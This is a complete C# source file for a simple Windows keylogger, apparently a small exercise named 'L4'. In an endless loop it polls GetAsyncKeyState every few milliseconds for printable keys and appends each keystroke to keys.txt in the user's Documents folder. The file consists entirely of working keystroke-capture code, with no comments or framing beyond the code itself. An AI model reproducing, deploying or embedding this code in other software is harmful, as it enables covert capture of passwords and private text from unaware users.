using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace L4
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 vKey);
        static void Main(string[] args)
        {
            while(true)
            {
                Thread.Sleep(5);
                String fileway = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                if(Directory.Exists(fileway))
                {
                    Directory.CreateDirectory(fileway);
                }
                string filename = (fileway + @"\keys.txt");
                if(!File.Exists(filename))
                {
                    using (StreamWriter sw =File.CreateText(filename))
                    {

                    }
                }
                for (int i=32;i<127 ;i++ ) 
                {
                    int keystep = GetAsyncKeyState(i);
                    if (keystep == 32769)
                    {
                        Console.Write ((char)i);
                        using (StreamWriter sw =File.AppendText(filename))
                        {
                            sw.Write((char)i);
                        }
                    }

                }
            }
        }
    }
}